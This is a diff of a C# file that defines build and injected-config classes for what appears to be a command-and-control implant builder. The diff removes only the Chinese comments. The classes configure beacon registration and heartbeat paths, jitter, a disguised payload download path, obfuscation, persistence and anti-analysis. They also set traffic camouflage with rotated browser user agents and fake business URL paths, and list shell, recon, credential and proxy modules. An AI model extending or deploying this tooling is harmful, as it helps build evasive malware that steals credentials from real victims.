@@ -6,23 +6,14 @@ public class BuildConfigRequest
     public string ApplicationType { get; set; } = "Console";
     public string ServerHost { get; set; } = "127.0.0.1";
     public int ServerPort { get; set; } = 5270;
-    /// 通信协议（"http"/"https"）；null = 按 ServerHost 前缀自动推断。
     public string? ServerScheme { get; set; }
-    /// 心跳间隔（毫秒）；null = 默认 3000，构建时 clamp 到 [500, 60000]。
     public ulong? HeartbeatIntervalMs { get; set; }
-    /// 抖动比例（0.0-0.9）；null = 默认 0.2，构建时 clamp。
     public double? JitterPercent { get; set; }
-    /// 注册路径；null = 默认 /api/beacon/register。
     public string? RegisterPath { get; set; }
-    /// 心跳路径；null = 默认 /api/beacon/heartbeat。
     public string? HeartbeatPath { get; set; }
-    /// 结果上报路径；null = 默认 /api/beacon/result。
     public string? ResultPath { get; set; }
-    /// WebSocket 路径；null = 默认 /ws/agent。
     public string? WsPath { get; set; }
-    /// 核心载荷下载路径；null = 默认 /api/v1/models/{buildId}。
     public string? CoreDownloadPath { get; set; }
-    /// 核心密钥协商路径；null = 默认 /api/v1/auth/token。
     public string? CoreKeyPath { get; set; }
     public bool EnableObfuscation { get; set; }
     public bool InjectJunkData { get; set; }
@@ -39,9 +30,7 @@ public class BuildConfigRequest
     public bool EnablePersistence { get; set; }
     public AntiAnalysisConfig AntiAnalysis { get; set; } = new();
 
-    // ── 流量伪装（构建时注入，注册后服务端 profile 可覆盖）────────────
 
-    /// UA 轮换列表（每行一个完整浏览器 UA）。
     public List<string> UserAgents { get; set; } = new()
     {
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
@@ -49,7 +38,6 @@ public class BuildConfigRequest
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
     };
 
-    /// 附加请求头（每行 "Name: value"）。
     public List<string> ExtraHeaders { get; set; } = new()
     {
         "Accept: application/json, text/plain, */*",
@@ -57,15 +45,12 @@ public class BuildConfigRequest
         "X-Requested-With: XMLHttpRequest",
     };
 
-    /// 虚假业务路径后缀（每行一个，agent 请求时随机拼到入口后）。
     public List<string> PathSuffixes { get; set; } = new()
     {
         "user/info", "orders/list", "profile", "settings",
         "notifications", "messages/unread", "search/history", "dashboard/stats",
     };
 
-    /// 启用的云模块（构建时只编译/部署这些；null/空 = 全部）。
-    /// 模块名与 CloudModules 一致：shell/recon/creds/files/powershell/proxy/script。
     public List<string>? EnabledModules { get; set; }
 }
 
@@ -129,7 +114,6 @@ public class InjectedConfig
     [System.Text.Json.Serialization.JsonPropertyName("anti_analysis")]
     public AntiAnalysisConfig? anti_analysis { get; set; }
 
-    // ── 流量伪装（构建时注入）────────────────────────────────────────
 
     [System.Text.Json.Serialization.JsonPropertyName("user_agents")]
     public List<string> user_agents { get; set; } = new();
@@ -140,7 +124,6 @@ public class InjectedConfig
     [System.Text.Json.Serialization.JsonPropertyName("path_suffixes")]
     public List<string> path_suffixes { get; set; } = new();
 
-    /// 服务端 RSA 公钥（SPKI DER b64，构建时注入，注册/密钥协商混合加密用）
     [System.Text.Json.Serialization.JsonPropertyName("server_public_key")]
     public string server_public_key { get; set; } = "";
 }
